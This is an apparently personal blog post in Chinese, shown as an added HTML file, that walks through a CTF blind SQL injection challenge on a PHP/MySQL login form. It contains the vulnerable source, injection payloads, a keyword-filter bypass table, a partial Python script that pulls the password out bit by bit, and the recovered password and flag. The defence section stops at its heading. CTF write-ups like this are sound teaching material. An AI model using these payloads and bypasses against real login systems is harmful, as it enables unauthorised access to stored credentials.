@@ -1,0 +1,255 @@
+<!DOCTYPE html><html lang="zh-CN" data-astro-cid-sckkx6r4> <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><!-- Run before styles and content so the saved theme is applied on first paint. --><script>
+  (() => {
+    let saved = null;
+    try {
+      saved = window.localStorage.getItem('theme');
+    } catch {
+      // Storage may be blocked; the system preference still works.
+    }
+    const theme = saved === 'dark' || saved === 'light'
+      ? saved
+      : window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+    document.documentElement.dataset.theme = theme;
+    document.documentElement.classList.add('js');
+
+    // Set the client configuration before the asynchronous Giscus script runs.
+    const updateGiscusScripts = () => {
+      document.querySelectorAll('script[src="https://giscus.app/client.js"]').forEach((script) => {
+        script.setAttribute('data-theme', document.documentElement.dataset.theme || theme);
+      });
+    };
+    const observer = new MutationObserver(updateGiscusScripts);
+    observer.observe(document.documentElement, { childList: true, subtree: true });
+    document.addEventListener('DOMContentLoaded', () => {
+      updateGiscusScripts();
+      observer.disconnect();
+    }, { once: true });
+  })();
+</script><meta name="description" content="登录框只回「成功」或「失败」，空格和常见关键字全被过滤。用 7 位二进制把密码一位一位问出来，32 个字符共 224 次请求。"><meta name="author" content="yyg"><meta name="theme-color" content="#f5f7fa" media="(prefers-color-scheme: light)"><meta name="theme-color" content="#10161d" media="(prefers-color-scheme: dark)"><meta property="og:site_name" content="yyg"><meta property="og:title" content="CTF Web 基础三题（一）—— SQL 盲注：从「万能密码」到把密码问出来 · yyg"><meta property="og:description" content="登录框只回「成功」或「失败」，空格和常见关键字全被过滤。用 7 位二进制把密码一位一位问出来，32 个字符共 224 次请求。"><meta property="og:image" content="https://yangpeter26-bot.github.io/avatar-yyg.jpg"><meta property="og:image:alt" content="yyg 的头像"><meta property="og:url" content="https://yangpeter26-bot.github.io/posts/ctf-web-basics-1-sqli/"><meta property="og:type" content="article"><meta property="og:locale" content="zh_CN"><meta property="article:published_time" content="2026-10-23"><meta name="twitter:card" content="summary"><title>CTF Web 基础三题（一）—— SQL 盲注：从「万能密码」到把密码问出来 · yyg</title><link rel="icon" type="image/svg+xml" href="/favicon.svg"><link rel="canonical" href="https://yangpeter26-bot.github.io/posts/ctf-web-basics-1-sqli/"><link rel="alternate" type="application/rss+xml" title="yyg RSS" href="https://yangpeter26-bot.github.io/rss.xml"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"CTF Web 基础三题（一）—— SQL 盲注：从「万能密码」到把密码问出来","datePublished":"2026-10-23","keywords":"Security, CTF, Web","author":{"@type":"Person","name":"yyg","url":"https://yangpeter26-bot.github.io/posts/about/"},"description":"登录框只回「成功」或「失败」，空格和常见关键字全被过滤。用 7 位二进制把密码一位一位问出来，32 个字符共 224 次请求。","url":"https://yangpeter26-bot.github.io/posts/ctf-web-basics-1-sqli/","image":"https://yangpeter26-bot.github.io/avatar-yyg.jpg","inLanguage":"zh-CN"}</script><link rel="stylesheet" href="/_astro/archive.RteHTq5J.css">
+<link rel="stylesheet" href="/_astro/_slug_.BrXo20_Y.css"></head> <body data-astro-cid-sckkx6r4> <a class="skip-link" href="#main-content" data-astro-cid-sckkx6r4>跳到正文</a> <header class="site-header" data-astro-cid-3ef6ksr2> <nav class="navigation glass" aria-label="主导航" data-astro-cid-3ef6ksr2> <a href="/" class="brand" aria-label="yyg，返回首页" data-astro-cid-3ef6ksr2> <span class="brand-mark" aria-hidden="true" data-astro-cid-3ef6ksr2>y</span><span data-astro-cid-3ef6ksr2>yyg</span> </a> <ul class="desktop-links" data-astro-cid-3ef6ksr2> <li data-astro-cid-3ef6ksr2><a href="/" data-astro-cid-3ef6ksr2>首页</a></li><li data-astro-cid-3ef6ksr2><a href="/archive/" aria-current="page" data-astro-cid-3ef6ksr2>文章</a></li><li data-astro-cid-3ef6ksr2><a href="/posts/about/" data-astro-cid-3ef6ksr2>关于</a></li><li data-astro-cid-3ef6ksr2><a href="/posts/guestbook/" data-astro-cid-3ef6ksr2>留言</a></li> </ul> <div class="nav-actions" data-astro-cid-3ef6ksr2> <button type="button" class="nav-action search-trigger" aria-label="搜索文章" aria-haspopup="dialog" aria-controls="search-dialog" data-search-open data-astro-cid-3ef6ksr2> <svg viewBox="0 0 24 24" aria-hidden="true" data-astro-cid-3ef6ksr2><circle cx="10.8" cy="10.8" r="6.8" data-astro-cid-3ef6ksr2></circle><path d="m16 16 4.5 4.5" data-astro-cid-3ef6ksr2></path></svg> </button> <button type="button" class="nav-action theme-button" id="theme-toggle" aria-label="切换深色主题" aria-pressed="false" data-astro-cid-3ef6ksr2> <svg class="icon-moon" viewBox="0 0 24 24" aria-hidden="true" data-astro-cid-3ef6ksr2><path d="M20.5 13.5A8.5 8.5 0 0 1 10.5 3.5a8.5 8.5 0 1 0 10 10Z" data-astro-cid-3ef6ksr2></path></svg> <svg class="icon-sun" viewBox="0 0 24 24" aria-hidden="true" data-astro-cid-3ef6ksr2><circle cx="12" cy="12" r="4" data-astro-cid-3ef6ksr2></circle><path d="M12 2v2m0 16v2M2 12h2m16 0h2M4.9 4.9l1.4 1.4m11.4 11.4 1.4 1.4m0-14.2-1.4 1.4M6.3 17.7l-1.4 1.4" data-astro-cid-3ef6ksr2></path></svg> </button> <button type="button" class="nav-action menu-toggle" id="hamburger" aria-label="展开导航" aria-controls="mobile-menu" aria-expanded="false" data-astro-cid-3ef6ksr2> <svg viewBox="0 0 24 24" aria-hidden="true" data-astro-cid-3ef6ksr2><path class="menu-line-top" d="M5 8h14" data-astro-cid-3ef6ksr2></path><path class="menu-line-bottom" d="M5 16h14" data-astro-cid-3ef6ksr2></path></svg> </button> </div> <ul class="mobile-navigation glass" id="mobile-menu" hidden data-astro-cid-3ef6ksr2> <li data-astro-cid-3ef6ksr2><a href="/" data-astro-cid-3ef6ksr2>首页<span aria-hidden="true" data-astro-cid-3ef6ksr2>↗</span></a></li><li data-astro-cid-3ef6ksr2><a href="/archive/" aria-current="page" data-astro-cid-3ef6ksr2>文章<span aria-hidden="true" data-astro-cid-3ef6ksr2>↗</span></a></li><li data-astro-cid-3ef6ksr2><a href="/posts/about/" data-astro-cid-3ef6ksr2>关于<span aria-hidden="true" data-astro-cid-3ef6ksr2>↗</span></a></li><li data-astro-cid-3ef6ksr2><a href="/posts/guestbook/" data-astro-cid-3ef6ksr2>留言<span aria-hidden="true" data-astro-cid-3ef6ksr2>↗</span></a></li> </ul> </nav> </header>  <main id="main-content" class="container page-main page-main--wide" tabindex="-1" data-astro-cid-sckkx6r4>  <div class="reading-progress" aria-hidden="true" data-astro-cid-gysqo7gh><span data-reading-progress data-astro-cid-gysqo7gh></span></div> <div class="reading-shell" data-astro-cid-gysqo7gh> <article class="article-panel surface" id="article-top" data-reading-article data-astro-cid-gysqo7gh> <header class="article-header" data-astro-cid-gysqo7gh> <nav class="article-breadcrumb" aria-label="当前位置" data-astro-cid-gysqo7gh> <a href="/" data-astro-cid-gysqo7gh>首页</a> <span aria-hidden="true" data-astro-cid-gysqo7gh>/</span> <a href="/archive/" data-astro-cid-gysqo7gh>文章</a> <span aria-hidden="true" data-astro-cid-gysqo7gh>/</span><a href="/series/#ctf-web-basics" data-astro-cid-gysqo7gh>CTF Web 基础三题</a> </nav> <p class="article-series-label" data-astro-cid-gysqo7gh>CTF Web 基础三题 <span data-astro-cid-gysqo7gh>· 第 1 / 3 篇</span></p> <h1 class="article-title" data-astro-cid-gysqo7gh>CTF Web 基础三题（一）—— SQL 盲注：从「万能密码」到把密码问出来</h1> <p class="article-summary" data-astro-cid-gysqo7gh>登录框只回「成功」或「失败」，空格和常见关键字全被过滤。用 7 位二进制把密码一位一位问出来，32 个字符共 224 次请求。</p> <div class="article-meta" data-astro-cid-gysqo7gh> <time datetime="2026-10-23" data-astro-cid-gysqo7gh>2026年10月23日</time> <span class="meta-separator" aria-hidden="true" data-astro-cid-gysqo7gh></span> <span data-astro-cid-gysqo7gh>约 5 分钟读完</span> </div> <ul class="article-tags" aria-label="文章标签" data-astro-cid-gysqo7gh> <li data-astro-cid-gysqo7gh><a href="/tags/Security/" data-astro-cid-gysqo7gh>Security</a></li><li data-astro-cid-gysqo7gh><a href="/tags/CTF/" data-astro-cid-gysqo7gh>CTF</a></li><li data-astro-cid-gysqo7gh><a href="/tags/Web/" data-astro-cid-gysqo7gh>Web</a></li> </ul> </header> <details class="mobile-toc" data-mobile-toc data-astro-cid-gysqo7gh> <summary data-astro-cid-gysqo7gh><span data-astro-cid-gysqo7gh>文章目录</span><span class="toc-count" data-astro-cid-gysqo7gh>11 个小节</span></summary> <nav aria-label="文章目录" data-astro-cid-gysqo7gh> <ol class="toc-list" data-astro-cid-gysqo7gh> <li data-astro-cid-gysqo7gh> <a href="#一一句话考点" data-toc-link data-astro-cid-gysqo7gh>一、一句话考点</a> </li><li data-astro-cid-gysqo7gh> <a href="#二题目长什么样" data-toc-link data-astro-cid-gysqo7gh>二、题目长什么样</a> </li><li data-astro-cid-gysqo7gh> <a href="#三为什么万能密码不行" data-toc-link data-astro-cid-gysqo7gh>三、为什么「万能密码」不行</a> </li><li data-astro-cid-gysqo7gh> <a href="#四过滤表被禁什么换什么" data-toc-link data-astro-cid-gysqo7gh>四、过滤表：被禁什么，换什么</a> </li><li data-astro-cid-gysqo7gh> <a href="#五建立-oracle先花-2-个请求" data-toc-link data-astro-cid-gysqo7gh>五、建立 oracle（先花 2 个请求）</a> </li><li data-astro-cid-gysqo7gh> <a href="#六提取算法每个字符-7-位" data-toc-link data-astro-cid-gysqo7gh>六、提取算法：每个字符 7 位</a> </li><li data-astro-cid-gysqo7gh> <a href="#七完整脚本节选" data-toc-link data-astro-cid-gysqo7gh>七、完整脚本（节选）</a> </li><li data-astro-cid-gysqo7gh> <a href="#八踩过的坑" data-toc-link data-astro-cid-gysqo7gh>八、踩过的坑</a> </li><li data-astro-cid-gysqo7gh> <a href="#九如果过滤再加一条" data-toc-link data-astro-cid-gysqo7gh>九、如果过滤再加一条</a> </li><li data-astro-cid-gysqo7gh> <a href="#十这类题怎么认" data-toc-link data-astro-cid-gysqo7gh>十、这类题怎么认</a> </li><li data-astro-cid-gysqo7gh> <a href="#十一防御写给自己以后修" data-toc-link data-astro-cid-gysqo7gh>十一、防御（写给自己以后修）</a> </li> </ol> </nav> </details> <div class="reading-content prose" id="article-content" data-reading-content data-astro-cid-gysqo7gh> <blockquote>
+<p>题目环境：PHP 7.4.5 + MySQL，登录框，<code>/?source</code> 泄露源码。
+最终 flag：<code>ctfhub{4b74024b72386ef7809c4d75}</code></p>
+</blockquote>
+<h2 id="一一句话考点">一、一句话考点</h2>
+<p><strong>这不是「绕过登录」，是「通过一个是非回答器，把数据库里的密码一位一位问出来」。</strong></p>
+<h2 id="二题目长什么样">二、题目长什么样</h2>
+<p><code>?source</code> 给出的核心代码：</p>
+<pre class="astro-code catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line"><span style="color:#CBA6F7">function</span><span style="color:#89B4FA;font-style:italic"> checkSql</span><span style="color:#9399B2">(</span><span style="color:#EBA0AC">$</span><span style="color:#EBA0AC;font-style:italic">s</span><span style="color:#9399B2">)</span><span style="color:#9399B2"> {</span></span>
+<span class="line"><span style="color:#CBA6F7">    if</span><span style="color:#9399B2">(</span><span style="color:#89B4FA;font-style:italic">preg_match</span><span style="color:#9399B2">(</span><span style="color:#F5C2E7">"/</span><span style="color:#A6E3A1">regexp|between|in|flag|=|>|&#x3C;|and|\||right|left|reverse|update|extractvalue|floor|substr|&#x26;|;|</span><span style="color:#F5C2E7">\\</span><span style="color:#F5C2E7">\$</span><span style="color:#A6E3A1">|0x|sleep|\ </span><span style="color:#F5C2E7">/i"</span><span style="color:#9399B2">,</span><span style="color:#CDD6F4"> $s</span><span style="color:#9399B2">)){</span></span>
+<span class="line"><span style="color:#89B4FA;font-style:italic">        alertMes</span><span style="color:#9399B2">(</span><span style="color:#A6E3A1">'hacker'</span><span style="color:#9399B2">,</span><span style="color:#A6E3A1"> 'index.php'</span><span style="color:#9399B2">);</span></span>
+<span class="line"><span style="color:#9399B2">    }</span></span>
+<span class="line"><span style="color:#9399B2">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#CDD6F4">$username </span><span style="color:#94E2D5">=</span><span style="color:#CDD6F4"> $_POST</span><span style="color:#9399B2">[</span><span style="color:#A6E3A1">'username'</span><span style="color:#9399B2">];</span></span>
+<span class="line"><span style="color:#CDD6F4">$password </span><span style="color:#94E2D5">=</span><span style="color:#CDD6F4"> $_POST</span><span style="color:#9399B2">[</span><span style="color:#A6E3A1">'password'</span><span style="color:#9399B2">];</span></span>
+<span class="line"><span style="color:#CBA6F7">if</span><span style="color:#9399B2"> (</span><span style="color:#CDD6F4">$username </span><span style="color:#94E2D5">!==</span><span style="color:#A6E3A1"> 'admin'</span><span style="color:#9399B2">)</span><span style="color:#9399B2"> {</span><span style="color:#89B4FA;font-style:italic"> alertMes</span><span style="color:#9399B2">(</span><span style="color:#A6E3A1">'only admin can login'</span><span style="color:#9399B2">,</span><span style="color:#A6E3A1"> 'index.php'</span><span style="color:#9399B2">);</span><span style="color:#9399B2"> }</span></span>
+<span class="line"><span style="color:#89B4FA;font-style:italic">checkSql</span><span style="color:#9399B2">(</span><span style="color:#CDD6F4">$password</span><span style="color:#9399B2">);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#CDD6F4">$sql </span><span style="color:#94E2D5">=</span><span style="color:#A6E3A1"> "</span><span style="color:#CBA6F7">SELECT</span><span style="color:#CBA6F7"> password</span><span style="color:#CBA6F7"> FROM</span><span style="color:#CDD6F4"> users </span><span style="color:#CBA6F7">WHERE</span><span style="color:#CDD6F4"> username</span><span style="color:#94E2D5">=</span><span style="color:#A6E3A1">'admin'</span><span style="color:#CBA6F7"> and</span><span style="color:#CBA6F7"> password</span><span style="color:#94E2D5">=</span><span style="color:#A6E3A1">'</span><span style="color:#CDD6F4">$password</span><span style="color:#A6E3A1">'</span><span style="color:#CDD6F4">;</span><span style="color:#A6E3A1">"</span><span style="color:#9399B2">;</span></span>
+<span class="line"><span style="color:#CDD6F4">$user_result </span><span style="color:#94E2D5">=</span><span style="color:#89B4FA;font-style:italic"> mysqli_query</span><span style="color:#9399B2">(</span><span style="color:#CDD6F4">$con</span><span style="color:#9399B2">,</span><span style="color:#CDD6F4"> $sql</span><span style="color:#9399B2">);</span></span>
+<span class="line"><span style="color:#CDD6F4">$row </span><span style="color:#94E2D5">=</span><span style="color:#89B4FA;font-style:italic"> mysqli_fetch_array</span><span style="color:#9399B2">(</span><span style="color:#CDD6F4">$user_result</span><span style="color:#9399B2">);</span></span>
+<span class="line"><span style="color:#CBA6F7">if</span><span style="color:#9399B2"> (</span><span style="color:#94E2D5">!</span><span style="color:#CDD6F4">$row</span><span style="color:#9399B2">)</span><span style="color:#9399B2"> {</span><span style="color:#89B4FA;font-style:italic"> alertMes</span><span style="color:#9399B2">(</span><span style="color:#A6E3A1">"something wrong"</span><span style="color:#9399B2">,</span><span style="color:#A6E3A1"> 'index.php'</span><span style="color:#9399B2">);</span><span style="color:#9399B2"> }</span></span>
+<span class="line"><span style="color:#CBA6F7">if</span><span style="color:#9399B2"> (</span><span style="color:#CDD6F4">$row</span><span style="color:#9399B2">[</span><span style="color:#A6E3A1">'password'</span><span style="color:#9399B2">]</span><span style="color:#94E2D5"> ===</span><span style="color:#CDD6F4"> $password</span><span style="color:#9399B2">)</span><span style="color:#9399B2"> {</span><span style="color:#CBA6F7"> die</span><span style="color:#9399B2">(</span><span style="color:#CDD6F4">$FLAG</span><span style="color:#9399B2">);</span><span style="color:#9399B2"> }</span></span>
+<span class="line"><span style="color:#CBA6F7">else</span><span style="color:#9399B2"> {</span><span style="color:#89B4FA;font-style:italic"> alertMes</span><span style="color:#9399B2">(</span><span style="color:#A6E3A1">"wrong password"</span><span style="color:#9399B2">,</span><span style="color:#A6E3A1"> 'index.php'</span><span style="color:#9399B2">);</span><span style="color:#9399B2"> }</span></span></code></pre>
+<p>三个关键事实：</p>
+<ol>
+<li><code>username</code> 必须<strong>严格等于</strong> <code>admin</code>，没有注入空间。</li>
+<li><code>password</code> 被直接拼进 SQL，可以注入。</li>
+<li><strong>查出来的密码还要和输入严格相等</strong>，才会给 flag。</li>
+</ol>
+<h2 id="三为什么万能密码不行">三、为什么「万能密码」不行</h2>
+<p>经典 payload：<code>' or 1#</code></p>
+<p>拼出来的 SQL：</p>
+<pre class="astro-code catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4; overflow-x: auto;" tabindex="0" data-language="sql"><code><span class="line"><span style="color:#CBA6F7">SELECT</span><span style="color:#CBA6F7"> password</span><span style="color:#CBA6F7"> FROM</span><span style="color:#CDD6F4"> users </span><span style="color:#CBA6F7">WHERE</span><span style="color:#CDD6F4"> username</span><span style="color:#94E2D5">=</span><span style="color:#A6E3A1">'admin'</span><span style="color:#CBA6F7"> and</span><span style="color:#CBA6F7"> password</span><span style="color:#94E2D5">=</span><span style="color:#A6E3A1">''</span><span style="color:#CBA6F7"> or</span><span style="color:#FAB387"> 1</span><span style="color:#CDD6F4">#</span><span style="color:#A6E3A1">';</span></span></code></pre>
+<p>WHERE 恒真，确实返回了 admin 那一行。但是——</p>
+<pre class="astro-code catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line"><span style="color:#CDD6F4">$row</span><span style="color:#9399B2">[</span><span style="color:#A6E3A1">'password'</span><span style="color:#9399B2">]</span><span style="color:#94E2D5"> ===</span><span style="color:#CDD6F4"> $password</span></span></code></pre>
+<p>左边是<strong>数据库里的真实密码</strong>，右边是你输入的 <code>' or 1#</code>，永远不相等。页面只会回 <code>wrong password</code>。</p>
+<p>所以这道题的目标不是「让查询返回行」，而是「知道真实密码」。</p>
+<h2 id="四过滤表被禁什么换什么">四、过滤表：被禁什么，换什么</h2>
+<p>黑名单（不区分大小写，且<strong>空格也被禁</strong>）：</p>
+<pre class="astro-code catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>regexp between in flag = > &#x3C; and | right left reverse</span></span>
+<span class="line"><span>update extractvalue floor substr &#x26; ; $ 0x sleep 空格</span></span></code></pre>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>被禁</th><th>替代写法</th><th>说明</th></tr></thead><tbody><tr><td>空格</td><td>不用空格，直接 <code>'or(...)#</code></td><td>关键字符相邻即可</td></tr><tr><td><code>=</code></td><td><code>like</code></td><td>字符串比较</td></tr><tr><td><code>substr</code></td><td><code>mid</code></td><td>同义函数</td></tr><tr><td><code>and</code></td><td><code>or</code></td><td><code>'' or 条件</code></td></tr><tr><td><code>></code> <code>&#x3C;</code></td><td>不需要</td><td>盲注只用「是不是」</td></tr><tr><td><code>;</code> 和收尾 <code>'</code></td><td><code>#</code></td><td>注释掉剩下的 SQL</td></tr><tr><td><code>flag</code></td><td>不查 flag 表</td><td>这里只需要 <code>users.password</code></td></tr></tbody></table>
+<p>顺带一个坑：<strong><code>admin</code> 本身就会触发过滤</strong>，因为 <code>admin</code> 里含 <code>in</code>。所以密码字段不能直接填 <code>admin</code>。</p>
+<h2 id="五建立-oracle先花-2-个请求">五、建立 oracle（先花 2 个请求）</h2>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>请求</th><th>查询结果</th><th>页面</th></tr></thead><tbody><tr><td><code>password='or(1)#</code></td><td>有行</td><td><code>wrong password</code></td></tr><tr><td><code>password='or(0)#</code></td><td>无行</td><td><code>something wrong</code></td></tr></tbody></table>
+<p>这两个不同响应就是「是 / 否」。</p>
+<p>这一步非常重要：<strong>在写任何脚本之前，先确认真假两个分支的响应确实不同</strong>。否则后面几百次请求全是废的。</p>
+<h2 id="六提取算法每个字符-7-位">六、提取算法：每个字符 7 位</h2>
+<p>一个 ASCII 字符 ≤ 127，用 <strong>7 位二进制</strong>表示。把每一位变成一个「是/否」问题：</p>
+<pre class="astro-code catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4; overflow-x: auto;" tabindex="0" data-language="sql"><code><span class="line"><span style="color:#9399B2;font-style:italic">-- 第 i 个字符的二进制，前 k 位是不是 prefix + "1"</span></span>
+<span class="line"><span style="color:#CDD6F4">lpad(conv(ord(mid(</span><span style="color:#CBA6F7">password</span><span style="color:#CDD6F4">,i,</span><span style="color:#FAB387">1</span><span style="color:#CDD6F4">)),</span><span style="color:#FAB387">10</span><span style="color:#CDD6F4">,</span><span style="color:#FAB387">2</span><span style="color:#CDD6F4">),</span><span style="color:#FAB387">7</span><span style="color:#CDD6F4">,</span><span style="color:#A6E3A1">'0'</span><span style="color:#CDD6F4">) </span><span style="color:#CBA6F7">like</span><span style="color:#A6E3A1"> 'prefix1%'</span></span></code></pre>
+<p>拆开看：</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>片段</th><th>作用</th></tr></thead><tbody><tr><td><code>mid(password,i,1)</code></td><td>取第 i 个字符</td></tr><tr><td><code>ord(...)</code></td><td>取 ASCII 码</td></tr><tr><td><code>conv(...,10,2)</code></td><td>十进制转二进制字符串</td></tr><tr><td><code>lpad(...,7,'0')</code></td><td>左补 0 到 7 位，保证长度一致</td></tr><tr><td><code>like '1101%'</code></td><td>问「前 4 位是不是 1101」</td></tr></tbody></table>
+<p>每一位问一次，7 次得到一个字符。<strong>32 个字符 = 224 次请求</strong>——必须脚本化。</p>
+<h2 id="七完整脚本节选">七、完整脚本（节选）</h2>
+<pre class="astro-code catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#CBA6F7">def</span><span style="color:#89B4FA;font-style:italic"> ok</span><span style="color:#9399B2">(</span><span style="color:#EBA0AC;font-style:italic">sql</span><span style="color:#9399B2">):</span></span>
+<span class="line"><span style="color:#A6E3A1">    """True = 查询有行（页面出现 wrong password）"""</span></span>
+<span class="line"><span style="color:#CDD6F4">    t </span><span style="color:#94E2D5">=</span><span style="color:#89B4FA"> raw</span><span style="color:#9399B2">(</span><span style="color:#A6E3A1">"'or("</span><span style="color:#94E2D5"> +</span><span style="color:#CDD6F4"> sql </span><span style="color:#94E2D5">+</span><span style="color:#A6E3A1"> ")#"</span><span style="color:#9399B2">)</span></span>
+<span class="line"><span style="color:#CDD6F4">    time</span><span style="color:#9399B2">.</span><span style="color:#89B4FA">sleep</span><span style="color:#9399B2">(</span><span style="color:#FAB387">0.7</span><span style="color:#9399B2">)</span></span>
+<span class="line"><span style="color:#CBA6F7">    if</span><span style="color:#A6E3A1"> 'wrong password'</span><span style="color:#CBA6F7"> in</span><span style="color:#CDD6F4"> t</span><span style="color:#9399B2">:</span><span style="color:#CBA6F7"> return</span><span style="color:#FAB387"> True</span></span>
+<span class="line"><span style="color:#CBA6F7">    if</span><span style="color:#A6E3A1"> 'something wrong'</span><span style="color:#CBA6F7"> in</span><span style="color:#CDD6F4"> t</span><span style="color:#9399B2">:</span><span style="color:#CBA6F7"> return</span><span style="color:#FAB387"> False</span></span>
+<span class="line"><span style="color:#CBA6F7">    raise</span><span style="color:#FAB387;font-style:italic"> RuntimeError</span><span style="color:#9399B2">(</span><span style="color:#A6E3A1">'unexpected: '</span><span style="color:#94E2D5"> +</span><span style="color:#EBA0AC;font-style:italic"> t</span><span style="color:#9399B2">[:</span><span style="color:#FAB387;font-style:italic">200</span><span style="color:#9399B2">])</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#CBA6F7">def</span><span style="color:#89B4FA;font-style:italic"> get_length</span><span style="color:#9399B2">():</span></span>
+<span class="line"><span style="color:#CBA6F7">    for</span><span style="color:#CDD6F4"> d </span><span style="color:#CBA6F7">in</span><span style="color:#A6E3A1"> '0123456789'</span><span style="color:#9399B2">:</span></span>
+<span class="line"><span style="color:#CBA6F7">        if</span><span style="color:#89B4FA"> ok</span><span style="color:#9399B2">(</span><span style="color:#A6E3A1">"length(password)like'3"</span><span style="color:#94E2D5"> +</span><span style="color:#CDD6F4"> d </span><span style="color:#94E2D5">+</span><span style="color:#A6E3A1"> "'"</span><span style="color:#9399B2">):</span></span>
+<span class="line"><span style="color:#CBA6F7">            return</span><span style="color:#FAB387"> 30</span><span style="color:#94E2D5"> +</span><span style="color:#CBA6F7;font-style:italic"> int</span><span style="color:#9399B2">(</span><span style="color:#CDD6F4">d</span><span style="color:#9399B2">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#CBA6F7">def</span><span style="color:#89B4FA;font-style:italic"> get_char</span><span style="color:#9399B2">(</span><span style="color:#EBA0AC;font-style:italic">i</span><span style="color:#9399B2">):</span></span>
+<span class="line"><span style="color:#CDD6F4">    pref </span><span style="color:#94E2D5">=</span><span style="color:#A6E3A1"> ''</span></span>
+<span class="line"><span style="color:#CBA6F7">    for</span><span style="color:#CDD6F4"> _ </span><span style="color:#CBA6F7">in</span><span style="color:#FAB387;font-style:italic"> range</span><span style="color:#9399B2">(</span><span style="color:#FAB387">7</span><span style="color:#9399B2">):</span></span>
+<span class="line"><span style="color:#CBA6F7">        if</span><span style="color:#89B4FA"> ok</span><span style="color:#9399B2">(</span><span style="color:#A6E3A1">"lpad(conv(ord(mid(password,</span><span style="color:#F5C2E7">{}</span><span style="color:#A6E3A1">,1)),10,2),7,'0')like'</span><span style="color:#F5C2E7">{}</span><span style="color:#A6E3A1">1%'"</span><span style="color:#9399B2">.</span><span style="color:#89B4FA">format</span><span style="color:#9399B2">(</span><span style="color:#CDD6F4">i</span><span style="color:#9399B2">,</span><span style="color:#CDD6F4"> pref</span><span style="color:#9399B2">)):</span></span>
+<span class="line"><span style="color:#CDD6F4">            pref </span><span style="color:#94E2D5">+=</span><span style="color:#A6E3A1"> '1'</span></span>
+<span class="line"><span style="color:#CBA6F7">        else</span><span style="color:#9399B2">:</span></span>
+<span class="line"><span style="color:#CDD6F4">            pref </span><span style="color:#94E2D5">+=</span><span style="color:#A6E3A1"> '0'</span></span>
+<span class="line"><span style="color:#CBA6F7">    return</span><span style="color:#FAB387;font-style:italic"> chr</span><span style="color:#9399B2">(</span><span style="color:#CBA6F7;font-style:italic">int</span><span style="color:#9399B2">(</span><span style="color:#CDD6F4">pref</span><span style="color:#9399B2">,</span><span style="color:#FAB387"> 2</span><span style="color:#9399B2">))</span></span></code></pre>
+<p>运行结果：</p>
+<pre class="astro-code catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>length = 32</span></span>
+<span class="line"><span>PASSWORD = 'CUIWWesAPMlE0OJbepfPY7EMq4sXG4mR'</span></span>
+<span class="line"><span>FINAL RESPONSE: ctfhub{4b74024b72386ef7809c4d75}</span></span></code></pre>
+<p>拿到密码后<strong>普通登录</strong>，<code>$row['password'] === $password</code> 成立，直接 <code>die($FLAG)</code>。</p>
+<h2 id="八踩过的坑">八、踩过的坑</h2>
+<ol>
+<li><strong>以为 <code>' or 1#</code> 就够了</strong>：忽略了 <code>===</code> 比较，白高兴一场。</li>
+<li><strong>没先验证 oracle</strong>：真假响应如果一样，后面全是无用功。</li>
+<li><strong>请求太快被限流</strong>：平台会返回 500，看起来像 WAF，其实是节流。加 <code>sleep(0.6)</code> 和重试退避。</li>
+<li><strong><code>admin</code> 触发过滤</strong>：测试时用 <code>admin</code> 当密码，页面回 <code>hacker</code>，一开始还以为是 WAF。</li>
+</ol>
+<h2 id="九如果过滤再加一条">九、如果过滤再加一条</h2>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>新过滤</th><th>应对</th></tr></thead><tbody><tr><td>禁 <code>like</code></td><td><code>REGEXP</code>（如果没禁）、<code>strcmp</code>、<code>greatest</code> 做比较</td></tr><tr><td>禁 <code>mid</code></td><td><code>substring</code>、<code>right</code>/<code>left</code>（如果没禁）</td></tr><tr><td>禁 <code>conv</code></td><td>十进制逐位：<code>ord(...) like '9%'</code> 做前缀搜索，或 <code>lpad</code> 手动补</td></tr><tr><td>禁 <code>#</code></td><td><code>-- </code> 需要空格，改用 <code>/**/</code> 注释收尾</td></tr><tr><td>禁 <code>or</code></td><td><code>||</code>（如果没禁）、<code>union</code> 配合 <code>where</code></td></tr></tbody></table>
+<h2 id="十这类题怎么认">十、这类题怎么认</h2>
+<p>看到下面这些信号，就该想到盲注：</p>
+<ul>
+<li>有 SQL 拼接（<code>"... '$x' ..."</code>）</li>
+<li>页面<strong>不回显查询结果</strong>，只有「成功/失败」「存在/不存在」</li>
+<li>过滤了常见关键字，但<strong>替换语法还在</strong></li>
+</ul>
+<h2 id="十一防御写给自己以后修">十一、防御（写给自己以后修）</h2>
